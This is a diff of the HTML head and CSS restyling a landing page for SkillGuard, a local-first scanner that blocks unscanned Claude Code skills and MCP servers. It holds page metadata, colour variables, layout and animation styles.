@@ -1,900 +1,998 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>SkillGuard — scan Claude Code skills before Claude runs them</title>
-  <meta name="description" content="Open-source scanner for Claude Code skills — catches prompt injection, credential theft, and reverse shells, and blocks unscanned skills with a PreToolUse hook. Local by default." />
-  <link rel="canonical" href="https://skillguard.sh/" />
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SkillGuard - refuse unscanned skills and MCP servers</title>
+<meta name="description" content="SkillGuard scans Claude Code skills and MCP servers, then blocks unscanned, changed, or critical/high targets before Claude runs them. Local first, secrets redacted.">
+<link rel="canonical" href="https://skillguard.sh/">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23D91F2F' stroke-width='2.2' stroke-linecap='square' stroke-linejoin='miter'%3E%3Cpath d='M4 4h16v16H4z'/%3E%3Cpath d='M12 7v7'/%3E%3Cpath d='M12 17h.01'/%3E%3C/svg%3E">
 
-  <!-- Favicon: inline SVG shield-with-check -->
-  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%233DDC97' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpath d='M12 2 4 5v6c0 5 3.5 8.5 8 10 4.5-1.5 8-5 8-10V5l-8-3Z'/%3E%3Cpath d='m9 12 2 2 4-4'/%3E%3C/svg%3E" />
+<meta property="og:type" content="website">
+<meta property="og:title" content="SkillGuard - refuse unscanned skills and MCP servers">
+<meta property="og:description" content="Scan Claude Code skills and MCP servers, then block unscanned, changed, or critical/high targets at the PreToolUse gate.">
+<meta property="og:image" content="https://skillguard.sh/og.png">
+<meta property="og:url" content="https://skillguard.sh/">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="SkillGuard - refuse unscanned skills and MCP servers">
+<meta name="twitter:description" content="A local-first PreToolUse gate for Claude Code skills and MCP servers.">
+<meta name="twitter:image" content="https://skillguard.sh/og.png">
 
-  <!-- Open Graph / Twitter -->
-  <meta property="og:type" content="website" />
-  <meta property="og:title" content="SkillGuard — scan Claude Code skills before Claude runs them" />
-  <meta property="og:description" content="Open-source scanner for Claude Code skills — catches prompt injection, credential theft, and reverse shells, and blocks unscanned skills with a PreToolUse hook. Local by default." />
-  <meta property="og:image" content="https://skillguard.sh/og.png" />
-  <meta property="og:url" content="https://skillguard.sh/" />
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="twitter:title" content="SkillGuard — scan Claude Code skills before Claude runs them" />
-  <meta name="twitter:description" content="Open-source scanner for Claude Code skills — catches prompt injection, credential theft, and reverse shells, and blocks unscanned skills with a PreToolUse hook. Local by default." />
-  <meta name="twitter:image" content="https://skillguard.sh/og.png" />
+<style>
+:root {
+  --paper: #f4f4f2;
+  --ink: #111111;
+  --ink-2: #2a2a2a;
+  --muted: #666666;
+  --line: #d5d5d2;
+  --line-strong: #111111;
+  --panel: #ffffff;
+  --panel-dark: #151515;
+  --red: #d91f2f;
+  --red-dark: #9f111d;
+  --red-soft: #ffe6e9;
+  --mono: ui-monospace, "SFMono-Regular", Menlo, Consolas, monospace;
+  --sans: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+  --max: 1120px;
+}
 
-  <!-- Fonts -->
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet" />
+* { box-sizing: border-box; }
 
-  <style>
-    :root {
-      --bg: #0B0E14;
-      --panel: #0D1117;
-      --panel-2: #11151C;
-      --border: #1E2530;
-      --text: #E6EAF0;
-      --muted: #9BA6B6;
-      --accent: #3DDC97;
-      --red: #FF5C5C;
-      --amber: #FFB454;
-      --font-ui: "Space Grotesk", system-ui, -apple-system, sans-serif;
-      --font-mono: "JetBrains Mono", ui-monospace, "SFMono-Regular", Menlo, monospace;
-      --maxw: 1080px;
-    }
+html { scroll-behavior: smooth; }
 
-    * { box-sizing: border-box; }
+body {
+  margin: 0;
+  background:
+    linear-gradient(var(--line) 1px, transparent 1px),
+    linear-gradient(90deg, var(--line) 1px, transparent 1px),
+    var(--paper);
+  background-size: 44px 44px;
+  color: var(--ink);
+  font-family: var(--sans);
+  font-size: 17px;
+  line-height: 1.55;
+  -webkit-font-smoothing: antialiased;
+  text-rendering: optimizeLegibility;
+}
 
-    html { scroll-behavior: smooth; }
+a { color: var(--ink); text-decoration-color: var(--red); text-underline-offset: 3px; }
+a:hover { color: var(--red-dark); }
 
-    body {
-      margin: 0;
-      background: var(--bg);
-      color: var(--text);
-      font-family: var(--font-ui);
-      font-size: 17px;
-      line-height: 1.6;
-      -webkit-font-smoothing: antialiased;
-      text-rendering: optimizeLegibility;
-    }
+a:focus-visible,
+button:focus-visible,
+summary:focus-visible {
+  outline: 3px solid var(--red);
+  outline-offset: 3px;
+}
 
-    a { color: var(--accent); text-decoration: none; }
-    a:hover { text-decoration: underline; }
+.skip-link {
+  position: absolute;
+  left: -999px;
+  top: 0;
+  z-index: 100;
+  background: var(--red);
+  color: #fff;
+  padding: 10px 14px;
+  font-weight: 800;
+}
+.skip-link:focus { left: 0; }
 
-    /* Visible focus states for accessibility */
-    a:focus-visible,
-    button:focus-visible {
-      outline: 2px solid var(--accent);
-      outline-offset: 3px;
-      border-radius: 4px;
-    }
+.wrap {
+  width: min(var(--max), calc(100% - 40px));
+  margin: 0 auto;
+}
 
-    .container {
-      width: 100%;
-      max-width: var(--maxw);
-      margin: 0 auto;
-      padding: 0 24px;
-    }
+.nav {
+  position: sticky;
+  top: 0;
+  z-index: 50;
+  background: rgba(244, 244, 242, 0.88);
+  border-bottom: 2px solid var(--ink);
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+}
 
-    /* ---------- Skip link ---------- */
-    .skip-link {
-      position: absolute;
-      left: -9999px;
-      top: 0;
-      background: var(--accent);
-      color: #04140C;
-      padding: 10px 16px;
-      font-weight: 600;
-      border-radius: 0 0 8px 0;
-      z-index: 100;
-    }
-    .skip-link:focus { left: 0; }
+.nav-inner {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 20px;
+  min-height: 62px;
+}
 
-    /* ---------- Nav ---------- */
-    .nav {
-      position: sticky;
-      top: 0;
-      z-index: 50;
-      background: rgba(11, 14, 20, 0.82);
-      backdrop-filter: blur(10px);
-      -webkit-backdrop-filter: blur(10px);
-      border-bottom: 1px solid var(--border);
-    }
-    .nav-inner {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      height: 60px;
-    }
-    .brand {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-weight: 700;
-      font-size: 19px;
-      color: var(--text);
-      letter-spacing: -0.01em;
-    }
-    .brand:hover { text-decoration: none; }
-    .brand svg { display: block; }
-    .nav-links {
-      display: flex;
-      align-items: center;
-      gap: 28px;
-    }
-    .nav-links a {
-      color: var(--muted);
-      font-size: 15px;
-      font-weight: 500;
-    }
-    .nav-links a:hover { color: var(--text); text-decoration: none; }
+.brand {
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+  color: var(--ink);
+  text-decoration: none;
+  font-family: var(--mono);
+  font-size: 15px;
+  font-weight: 800;
+  text-transform: uppercase;
+}
 
-    /* ---------- Hero ---------- */
-    .hero {
-      position: relative;
-      padding: 90px 0 70px;
-      overflow: hidden;
-    }
-    /* Single restrained radial green glow behind the install box */
-    .hero::before {
-      content: "";
-      position: absolute;
-      top: 46%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      width: 760px;
-      height: 520px;
-      max-width: 95vw;
-      background: radial-gradient(ellipse at center, rgba(61, 220, 151, 0.16) 0%, rgba(61, 220, 151, 0.05) 38%, transparent 70%);
-      pointer-events: none;
-      z-index: 0;
-    }
-    .hero .container { position: relative; z-index: 1; }
+.mark-box {
+  display: grid;
+  place-items: center;
+  width: 26px;
+  height: 26px;
+  background: var(--ink);
+  color: #fff;
+  border: 2px solid var(--ink);
+  font-family: var(--mono);
+  font-size: 18px;
+  line-height: 1;
+}
 
-    h1 {
-      font-size: clamp(34px, 6vw, 56px);
-      line-height: 1.08;
-      font-weight: 700;
-      letter-spacing: -0.025em;
-      margin: 0 auto 24px;
-      max-width: 880px;
-      text-align: center;
-    }
-    h1 .em { color: var(--accent); }
-    .subhead {
-      font-size: clamp(17px, 2.4vw, 21px);
-      color: var(--muted);
-      max-width: 720px;
-      margin: 0 auto 44px;
-      text-align: center;
-    }
-    .subhead strong { color: var(--text); font-weight: 600; }
+.nav-links {
+  display: flex;
+  align-items: center;
+  gap: 18px;
+  font-family: var(--mono);
+  font-size: 13px;
+  text-transform: uppercase;
+}
 
-    /* ---------- Install block ---------- */
-    .install {
-      max-width: 660px;
-      margin: 0 auto;
-    }
-    .codebox {
-      position: relative;
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      box-shadow: 0 18px 50px -20px rgba(0, 0, 0, 0.7);
-    }
-    .codebox-head {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      padding: 10px 14px 10px 16px;
-      border-bottom: 1px solid var(--border);
-    }
-    .codebox-label {
-      font-family: var(--font-mono);
-      font-size: 12px;
-      color: var(--muted);
-      letter-spacing: 0.04em;
-      text-transform: uppercase;
-    }
-    .copy-btn {
-      font-family: var(--font-mono);
-      font-size: 13px;
-      font-weight: 500;
-      color: var(--muted);
-      background: var(--panel-2);
-      border: 1px solid var(--border);
-      border-radius: 7px;
-      padding: 6px 12px;
-      cursor: pointer;
-      transition: color 0.15s, border-color 0.15s;
-      white-space: nowrap;
-    }
-    .copy-btn:hover { color: var(--text); border-color: #2A3340; }
-    .copy-btn.copied { color: var(--accent); border-color: var(--accent); }
-    .codebox pre {
-      margin: 0;
-      padding: 18px 16px;
-      overflow-x: auto;
-      font-family: var(--font-mono);
-      font-size: 15px;
-      line-height: 1.85;
-      color: var(--text);
-    }
-    .codebox pre .prompt { color: var(--accent); user-select: none; }
+.nav-links a {
+  color: var(--ink);
+  text-decoration: none;
+  border-bottom: 2px solid transparent;
+}
+.nav-links a:hover { border-color: var(--red); }
 
-    .verify {
-      margin: 18px 4px 0;
-      font-size: 15px;
-      color: var(--muted);
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      gap: 6px 14px;
-    }
-    .verify .check { color: var(--accent); font-weight: 700; }
-    .verify .sep { color: var(--border); }
-    .verify-links { display: flex; gap: 16px; margin-left: auto; }
-    .verify-links a { font-size: 14px; font-weight: 500; }
+.hero {
+  padding: 72px 0 58px;
+  border-bottom: 2px solid var(--ink);
+}
 
-    /* ---------- Gate animation ----------
-       Skill chips ride a conveyor toward the SkillGuard gate: clean skills
-       turn green and pass through to Claude; the malicious one is stopped,
-       flagged, and dropped. Pure CSS; static tableau under reduced motion. */
-    .gate {
-      max-width: 860px;
-      margin: 0 auto 48px;
-    }
-    .gate-labels {
-      display: flex;
-      justify-content: space-between;
-      padding: 0 6px;
-      margin-bottom: 6px;
-      font-family: var(--font-mono);
-      font-size: 11px;
-      letter-spacing: 0.14em;
-      text-transform: uppercase;
-      color: var(--muted);
-    }
-    .gate-track {
-      position: relative;
-      height: 96px;
-      overflow: hidden;
-    }
-    .gate-track::before {
-      content: "";
-      position: absolute;
-      left: 0;
-      right: 0;
-      top: 50%;
-      height: 1px;
-      background: linear-gradient(90deg, transparent, var(--border) 12%, var(--border) 88%, transparent);
-    }
-    .gate-post {
-      position: absolute;
-      left: 50%;
-      top: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 3;
-      width: 46px;
-      height: 46px;
-      display: grid;
-      place-items: center;
-      background: var(--panel-2);
-      border: 1px solid rgba(61, 220, 151, 0.45);
-      border-radius: 50%;
-      box-shadow: 0 0 26px rgba(61, 220, 151, 0.22);
-    }
-    .chip {
-      position: absolute;
-      top: 50%;
-      left: -14%;
-      transform: translate(-50%, -50%);
-      z-index: 1;
-      display: flex;
-      align-items: center;
-      gap: 7px;
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 9px;
-      padding: 7px 12px;
-      font-family: var(--font-mono);
-      font-size: 12.5px;
-      color: var(--text);
-      white-space: nowrap;
-      opacity: 0;
-      will-change: left, opacity;
-      animation: gate-pass 12s linear infinite;
-      animation-delay: var(--d);
-    }
-    .chip-mark { font-weight: 700; opacity: 0; }
-    .chip-clean .chip-mark {
-      color: var(--accent);
-      animation: gate-mark 12s linear infinite;
-      animation-delay: var(--d);
-    }
-    .chip-bad {
-      animation-name: gate-blocked;
-    }
-    .chip-bad .chip-mark {
-      color: var(--red);
-      animation: gate-badmark 12s linear infinite;
-      animation-delay: var(--d);
-    }
-    .chip-tag {
-      position: absolute;
-      top: calc(100% + 6px);
-      left: 50%;
-      transform: translateX(-50%);
-      font-size: 11px;
-      color: var(--red);
-      background: rgba(255, 92, 92, 0.08);
-      border: 1px solid rgba(255, 92, 92, 0.35);
-      border-radius: 6px;
-      padding: 1px 8px;
-      white-space: nowrap;
-      opacity: 0;
-      animation: gate-badmark 12s linear infinite;
-      animation-delay: var(--d);
-    }
+.hero-grid {
+  display: grid;
+  grid-template-columns: minmax(0, 0.95fr) minmax(360px, 1.05fr);
+  gap: 42px;
+  align-items: center;
+}
 
-    /* Clean chip: enter left, turn green at the gate, exit right. */
-    @keyframes gate-pass {
-      0%   { left: -14%; opacity: 0; border-color: var(--border); }
-      2%   { opacity: 1; }
-      21%  { border-color: var(--border); }
-      24%  { border-color: var(--accent); }
-      43%  { opacity: 1; }
-      45%  { left: 114%; opacity: 0; border-color: var(--accent); }
-      100% { left: 114%; opacity: 0; }
-    }
-    @keyframes gate-mark {
-      0%, 21%   { opacity: 0; }
-      24%, 43%  { opacity: 1; }
-      45%, 100% { opacity: 0; }
-    }
-    /* Malicious chip: stopped just shy of the gate, shaken, flagged, dropped.
-       Right-edge anchored (translateX(-100%)) so it never slides under the post. */
-    @keyframes gate-blocked {
-      0%    { left: -14%; top: 50%; opacity: 0; border-color: var(--border); transform: translate(-100%, -50%); }
-      2%    { opacity: 1; }
-      19.5% { left: calc(50% - 30px); top: 50%; border-color: var(--border); transform: translate(-100%, -50%); }
-      20.5% { border-color: var(--red); }
-      21.5% { transform: translate(-100%, -50%) translateX(-4px); }
-      23%   { transform: translate(-100%, -50%) translateX(4px); }
-      24.5% { transform: translate(-100%, -50%) translateX(-2px); }
-      26%   { transform: translate(-100%, -50%) translateX(0); }
-      34%   { left: calc(50% - 30px); top: 50%; opacity: 1; transform: translate(-100%, -50%); }
-      42%   { left: calc(50% - 30px); top: 88%; opacity: 0; border-color: var(--red); transform: translate(-100%, -50%); }
-      100%  { left: calc(50% - 30px); top: 88%; opacity: 0; transform: translate(-100%, -50%); }
-    }
-    @keyframes gate-badmark {
-      0%, 20%   { opacity: 0; }
-      22%, 36%  { opacity: 1; }
-      42%, 100% { opacity: 0; }
-    }
+.hero-grid > * { min-width: 0; }
 
-    /* Reduced motion: freeze the story as a static tableau. */
-    @media (prefers-reduced-motion: reduce) {
-      .chip, .chip-mark, .chip-tag { animation: none !important; }
-      .chip { opacity: 1; }
-      .chip.c1 { left: 72%; border-color: var(--accent); }
-      .chip.c1 .chip-mark { opacity: 1; }
-      .chip.cb { left: 36%; border-color: var(--red); }
-      .chip.cb .chip-mark, .chip.cb .chip-tag { opacity: 1; }
-      .chip.c2 { left: 10%; }
-      .chip.c3 { display: none; }
-    }
+.eyebrow {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  margin: 0 0 20px;
+  font-family: var(--mono);
+  font-size: 12px;
+  font-weight: 800;
+  text-transform: uppercase;
+}
+.eyebrow::before {
+  content: "";
+  display: inline-block;
+  width: 10px;
+  height: 10px;
+  background: var(--red);
+}
 
-    /* ---------- Section scaffolding ---------- */
-    section { padding: 72px 0; }
-    .section-label {
-      font-family: var(--font-mono);
-      font-size: 13px;
-      letter-spacing: 0.18em;
-      text-transform: uppercase;
-      color: var(--accent);
-      text-align: center;
-      margin: 0 0 14px;
-    }
-    h2 {
-      font-size: clamp(26px, 4vw, 34px);
-      font-weight: 600;
-      letter-spacing: -0.02em;
-      text-align: center;
-      margin: 0 0 48px;
-    }
+h1 {
+  max-width: 680px;
+  margin: 0 0 22px;
+  font-size: 78px;
+  line-height: 0.93;
+  font-weight: 900;
+  letter-spacing: 0;
+  text-transform: uppercase;
+}
 
-    /* ---------- Demo / terminal ---------- */
-    .terminal {
-      max-width: 820px;
-      margin: 0 auto;
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      overflow: hidden;
-      box-shadow: 0 24px 60px -28px rgba(0, 0, 0, 0.8);
-    }
-    .terminal-bar {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 12px 16px;
-      background: var(--panel-2);
-      border-bottom: 1px solid var(--border);
-    }
-    .dot { width: 12px; height: 12px; border-radius: 50%; display: block; }
-    .dot.r { background: #FF5F56; }
-    .dot.y { background: #FFBD2E; }
-    .dot.g { background: #27C93F; }
-    .terminal-title {
-      margin-left: 10px;
-      font-family: var(--font-mono);
-      font-size: 12.5px;
-      color: var(--muted);
-    }
-    .terminal video {
-      display: block;
-      width: 100%;
-      height: auto;
-      background: var(--bg);
-    }
-    /* Static <pre> fallback transcript (no-JS / reduced-motion) */
-    .transcript {
-      margin: 0;
-      padding: 22px 20px;
-      font-family: var(--font-mono);
-      font-size: 14.5px;
-      line-height: 1.85;
-      color: var(--text);
-      overflow-x: auto;
-      background: var(--bg);
-    }
-    .transcript .prompt { color: var(--accent); }
-    .transcript .dim { color: var(--muted); }
-    .transcript .scan { color: var(--amber); }
-    .transcript .blocked { color: var(--red); font-weight: 500; }
-    .transcript .refused { color: var(--muted); }
+h1 span {
+  color: var(--red);
+  display: block;
+}
 
-    /* The fallback transcript is shown when video is absent or motion is reduced */
-    .terminal[data-show-fallback="true"] video { display: none; }
-    .terminal:not([data-show-fallback="true"]) .transcript { display: none; }
+.sub {
+  max-width: 670px;
+  margin: 0 0 28px;
+  color: var(--ink-2);
+  font-size: 21px;
+  line-height: 1.42;
+  overflow-wrap: anywhere;
+}
 
-    @media (prefers-reduced-motion: reduce) {
-      .terminal video { display: none !important; }
-      .terminal .transcript { display: block !important; }
-      html { scroll-behavior: auto; }
-    }
+.meta-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px;
+  margin: 0 0 24px;
+  padding: 0;
+  list-style: none;
+}
 
-    /* ---------- Pillars ---------- */
-    .pillars {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 22px;
-    }
-    .pillar {
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 28px 24px;
-    }
-    .pillar-icon {
-      color: var(--accent);
-      margin-bottom: 16px;
-      display: block;
-    }
-    .pillar h3 {
-      font-size: 19px;
-      font-weight: 600;
-      margin: 0 0 10px;
-      letter-spacing: -0.01em;
-    }
-    .pillar p { margin: 0; color: var(--muted); font-size: 16px; }
-    .pillar p code {
-      font-family: var(--font-mono);
-      font-size: 14px;
-      color: var(--text);
-      background: var(--panel-2);
-      padding: 1px 6px;
-      border-radius: 5px;
-    }
+.meta-row li {
+  border: 2px solid var(--ink);
+  background: var(--panel);
+  padding: 6px 10px;
+  font-family: var(--mono);
+  font-size: 12px;
+  font-weight: 800;
+  text-transform: uppercase;
+}
 
-    /* ---------- What it catches ---------- */
-    .evidence {
-      max-width: 720px;
-      margin: -26px auto 46px;
-      text-align: center;
-      color: var(--muted);
-      font-size: 16.5px;
-    }
-    .evidence strong { color: var(--text); font-weight: 600; }
-    .catches {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 16px 28px;
-      max-width: 820px;
-      margin: 0 auto;
-    }
-    .catch {
-      display: flex;
-      align-items: flex-start;
-      gap: 13px;
-      background: var(--panel);
-      border: 1px solid var(--border);
-      border-radius: 10px;
-      padding: 16px 18px;
-      font-size: 16px;
-    }
-    .catch svg { flex: 0 0 auto; color: var(--accent); margin-top: 3px; }
+.install-box {
+  width: 100%;
+  min-width: 0;
+  max-width: 720px;
+  background: var(--panel-dark);
+  color: #f7f7f7;
+  border: 2px solid var(--ink);
+  box-shadow: 8px 8px 0 var(--red);
+}
 
-    /* ---------- Second CTA ---------- */
-    .cta-section { text-align: center; }
-    .cta-section .install { margin-top: 8px; }
-    .license-line {
-      margin: 20px auto 0;
-      max-width: 660px;
-      font-size: 14.5px;
-      color: var(--muted);
-    }
+.install-head {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+  border-bottom: 1px solid #3a3a3a;
+  padding: 10px 12px;
+  font-family: var(--mono);
+  font-size: 12px;
+  text-transform: uppercase;
+}
 
-    /* ---------- Footer ---------- */
-    footer {
-      border-top: 1px solid var(--border);
-      padding: 40px 0;
-    }
-    .footer-inner {
-      display: flex;
-      flex-wrap: wrap;
-      align-items: center;
-      justify-content: space-between;
-      gap: 16px;
-    }
-    .footer-brand {
-      display: flex;
-      align-items: center;
-      gap: 9px;
-      font-weight: 600;
-      color: var(--text);
-    }
-    .footer-links {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 12px 22px;
-      align-items: center;
-      color: var(--muted);
-      font-size: 15px;
-    }
-    .footer-links a { color: var(--muted); }
-    .footer-links a:hover { color: var(--text); }
-    .footer-links .sep { color: var(--border); }
-    .footer-note { color: var(--muted); font-size: 15px; }
+.copy-btn {
+  appearance: none;
+  border: 1px solid #f7f7f7;
+  background: transparent;
+  color: #f7f7f7;
+  padding: 6px 10px;
+  font-family: var(--mono);
+  font-size: 12px;
+  font-weight: 800;
+  cursor: pointer;
+  text-transform: uppercase;
+}
+.copy-btn:hover,
+.copy-btn.copied {
+  background: var(--red);
+  border-color: var(--red);
+  color: #fff;
+}
 
-    /* ---------- Responsive ---------- */
-    @media (max-width: 860px) {
-      .pillars { grid-template-columns: 1fr; }
-      .catches { grid-template-columns: 1fr; }
-    }
-    @media (max-width: 600px) {
-      body { font-size: 16px; }
-      .nav-links { gap: 18px; }
-      .hero { padding: 60px 0 50px; }
-      section { padding: 56px 0; }
-      .verify-links { margin-left: 0; width: 100%; }
-      .codebox pre { font-size: 13.5px; }
-      .transcript { font-size: 12.5px; }
-      .gate { margin-bottom: 36px; }
-      .gate-track { height: 84px; }
-      .chip { font-size: 11px; padding: 6px 9px; }
-      .chip-tag { font-size: 10px; }
-      .gate-labels { font-size: 10px; }
-      /* Chips are proportionally wider on a narrow track: run three instead
-         of four so the trailer never catches the chip parked at the gate. */
-      .chip.c2 { display: none; }
-    }
-    @media (max-width: 380px) {
-      .container { padding: 0 16px; }
-      .brand { font-size: 17px; }
-      .nav-links a { font-size: 14px; }
-    }
-  </style>
+.install-box pre {
+  margin: 0;
+  padding: 16px 14px 18px;
+  overflow-x: auto;
+  font-family: var(--mono);
+  font-size: 14px;
+  line-height: 1.8;
+  white-space: pre-wrap;
+  overflow-wrap: anywhere;
+}
+
+.indent { padding-left: 1.25em; }
+
+.prompt { color: #ff7a86; user-select: none; }
+
+.install-note {
+  margin: 15px 0 0;
+  color: var(--muted);
+  font-size: 14px;
+}
+
+.install-note a { font-weight: 800; }
+
+.wall {
+  width: 100%;
+  min-width: 0;
+  background: var(--panel);
+  border: 2px solid var(--ink);
+  box-shadow: 10px 10px 0 var(--ink);
+  overflow: hidden;
+}
+
+.wall-top {
+  display: grid;
+  grid-template-columns: 1fr auto;
+  align-items: center;
+  gap: 12px;
+  border-bottom: 2px solid var(--ink);
+  padding: 12px 14px;
+  font-family: var(--mono);
+  font-size: 12px;
+  font-weight: 800;
+  text-transform: uppercase;
+}
+
+.status-red {
+  background: var(--red);
+  color: #fff;
+  padding: 5px 8px;
+}
+
+.wall-stage {
+  position: relative;
+  height: 260px;
+  overflow: hidden;
+  background:
+    linear-gradient(90deg, transparent 0 49%, var(--red) 49% 51%, transparent 51% 100%),
+    repeating-linear-gradient(0deg, #fff, #fff 19px, #eeeeec 20px);
+}
+
+.wall-label {
+  position: absolute;
+  top: 18px;
+  left: calc(50% + 16px);
+  font-family: var(--mono);
+  font-size: 11px;
+  font-weight: 800;
+  color: var(--red);
+  text-transform: uppercase;
+}
+
+.request-card {
+  position: absolute;
+  left: 22px;
+  top: 84px;
+  width: 250px;
+  border: 2px solid var(--ink);
+  background: #fff;
+  box-shadow: 5px 5px 0 rgba(17, 17, 17, 0.22);
+  font-family: var(--mono);
+  transform: translateX(calc(50% - 154px));
+  opacity: 1;
+}
+
+.request-card::before {
+  content: "Skill";
+  display: block;
+  background: var(--ink);
+  color: #fff;
+  padding: 7px 9px;
+  font-size: 11px;
+  font-weight: 800;
+  text-transform: uppercase;
+}
+
+.request-card div { padding: 9px; }
+
+.request-name {
+  display: block;
+  margin-bottom: 7px;
+  font-size: 15px;
+  font-weight: 800;
+}
+
+.request-risk {
+  display: inline-block;
+  border: 2px solid var(--red);
+  color: var(--red);
+  padding: 3px 6px;
+  font-size: 11px;
+  font-weight: 800;
+  text-transform: uppercase;
+}
+
+.stamp {
+  position: absolute;
+  right: 30px;
+  top: 82px;
+  border: 5px solid var(--red);
+  color: var(--red);
+  padding: 11px 14px;
+  font-family: var(--mono);
+  font-size: 30px;
+  font-weight: 900;
+  text-transform: uppercase;
+  transform: rotate(-9deg) scale(1);
+  opacity: 1;
+}
+
+@media (prefers-reduced-motion: no-preference) {
+  .request-card {
+    animation: request-hit 6s cubic-bezier(.5, 0, .1, 1) infinite;
+    animation-delay: -2.9s;
+  }
+  .stamp {
+    animation: stamp-in 6s steps(1, end) infinite;
+    animation-delay: -3.6s;
+  }
+}
+
+.receipt {
+  border-top: 2px solid var(--ink);
+  padding: 16px;
+  background: var(--panel-dark);
+  color: #f7f7f7;
+  font-family: var(--mono);
+  font-size: 13px;
+}
+
+.receipt-grid {
+  display: grid;
+  grid-template-columns: auto 1fr;
+  gap: 7px 13px;
+}
+
+.receipt dt { color: #a6a6a6; }
+.receipt dd { margin: 0; }
+.receipt .red { color: #ff7a86; font-weight: 800; }
+
+@keyframes request-hit {
+  0% { transform: translateX(-320px); opacity: 0; }
+  9% { transform: translateX(0); opacity: 1; }
+  48% { transform: translateX(calc(50% - 154px)); opacity: 1; }
+  58% { transform: translateX(calc(50% - 164px)); opacity: 1; }
+  68% { transform: translateX(calc(50% - 154px)); opacity: 1; }
+  82% { transform: translateX(calc(50% - 154px)); opacity: 1; }
+  100% { transform: translateX(calc(50% - 154px)); opacity: 0; }
+}
+
+@keyframes stamp-in {
+  0%, 54% { opacity: 0; }
+  55%, 86% { opacity: 1; transform: rotate(-9deg) scale(1); }
+  87%, 100% { opacity: 0; }
+}
+
+section {
+  padding: 70px 0;
+  border-bottom: 2px solid var(--ink);
+}
+
+.section-kicker {
+  margin: 0 0 12px;
+  font-family: var(--mono);
+  font-size: 12px;
+  font-weight: 900;
+  text-transform: uppercase;
+  color: var(--red);
+}
+
+h2 {
+  margin: 0 0 28px;
+  max-width: 780px;
+  font-size: 44px;
+  line-height: 1.04;
+  font-weight: 900;
+  letter-spacing: 0;
+  text-transform: uppercase;
+}
+
+.proof-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 0;
+  border: 2px solid var(--ink);
+  background: var(--panel);
+}
+
+.proof-card {
+  min-height: 210px;
+  padding: 22px;
+  border-right: 2px solid var(--ink);
+}
+.proof-card:last-child { border-right: 0; }
+
+.proof-num {
+  display: block;
+  margin-bottom: 15px;
+  font-family: var(--mono);
+  font-size: 54px;
+  line-height: 0.9;
+  font-weight: 900;
+  color: var(--red);
+}
+
+.proof-card h3 {
+  margin: 0 0 10px;
+  font-size: 20px;
+  line-height: 1.15;
+}
+
+.proof-card p {
+  margin: 0;
+  color: var(--muted);
+  font-size: 15px;
+}
+
+.proof-note {
+  margin: 16px 0 0;
+  color: var(--muted);
+  font-size: 14px;
+}
+
+.terminal {
+  border: 2px solid var(--ink);
+  background: var(--panel-dark);
+  color: #f7f7f7;
+}
+
+.terminal-bar {
+  display: flex;
+  align-items: center;
+  gap: 7px;
+  border-bottom: 1px solid #3a3a3a;
+  padding: 11px 13px;
+}
+
+.dot {
+  width: 12px;
+  height: 12px;
+  border: 1px solid #f7f7f7;
+  background: #2f2f2f;
+}
+.dot:first-child { background: var(--red); border-color: var(--red); }
+
+.terminal-title {
+  margin-left: 8px;
+  color: #bfbfbf;
+  font-family: var(--mono);
+  font-size: 12px;
+  text-transform: uppercase;
+}
+
+.terminal video {
+  display: block;
+  width: 100%;
+  height: auto;
+  background: #050505;
+}
+
+.transcript {
+  margin: 0;
+  padding: 22px 18px;
+  overflow-x: auto;
+  background: #050505;
+  color: #f7f7f7;
+  font-family: var(--mono);
+  font-size: 14px;
+  line-height: 1.8;
+}
+
+.transcript .dim { color: #999; }
+.transcript .bad { color: #ff7a86; font-weight: 800; }
+.terminal[data-show-fallback="true"] video { display: none; }
+.terminal:not([data-show-fallback="true"]) .transcript { display: none; }
+
+.steps {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 18px;
+}
+
+.step {
+  background: var(--panel);
+  border: 2px solid var(--ink);
+  padding: 22px;
+  min-height: 230px;
+}
+
+.step-num {
+  display: inline-grid;
+  place-items: center;
+  width: 38px;
+  height: 38px;
+  margin-bottom: 20px;
+  background: var(--ink);
+  color: #fff;
+  font-family: var(--mono);
+  font-weight: 900;
+}
+
